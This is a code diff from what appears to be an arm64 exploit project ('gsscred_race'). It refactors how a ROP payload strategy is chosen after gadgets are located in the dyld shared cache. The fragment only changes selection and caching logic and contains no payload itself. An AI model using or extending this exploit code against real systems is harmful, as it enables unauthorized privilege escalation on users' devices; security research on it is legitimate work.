@@ -8,7 +8,10 @@ const struct payload_strategy *strategies[] = {
 	&payload_strategy_1,
 };
 
-static gsscred_race_platform_payload_generator_fn payload_generator = NULL;
+#define STRATEGY_NOT_CHOSEN	((const struct payload_strategy *)1)
+
+// The chosen payload strategy.
+static const struct payload_strategy *chosen_strategy = STRATEGY_NOT_CHOSEN;
 
 // Find the dyld shared cache's code segments in our process.
 static bool
@@ -96,26 +99,25 @@ find_gadgets_in_dyld_shared_cache() {
 	find_gadgets((uint64_t) dyld_shared_cache, dyld_shared_cache, dyld_shared_cache_size);
 }
 
-// Choose the payload generator given the available gadgets.
+// Choose the payload strategy given the available gadgets.
 static void
-choose_payload_generator() {
+choose_payload_strategy() {
 	for (size_t i = 0; i < sizeof(strategies) / sizeof(strategies[0]); i++) {
 		const struct payload_strategy *strategy = strategies[i];
 		if (strategy->check_platform()) {
 			DEBUG_TRACE(2, "Using payload strategy %zu", i + 1);
-			payload_generator = strategy->build_payload;
-			break;
+			chosen_strategy = strategy;
+			return;
 		}
 	}
+	chosen_strategy = NULL;
 }
 
-gsscred_race_platform_payload_generator_fn
+const struct payload_strategy *
 arm64_choose_payload(void) {
-	static bool chosen = false;
-	if (payload_generator == NULL && !chosen) {
+	if (chosen_strategy == STRATEGY_NOT_CHOSEN) {
 		find_gadgets_in_dyld_shared_cache();
-		choose_payload_generator();
-		chosen = true;
+		choose_payload_strategy();
 	}
-	return payload_generator;
+	return chosen_strategy;
 }
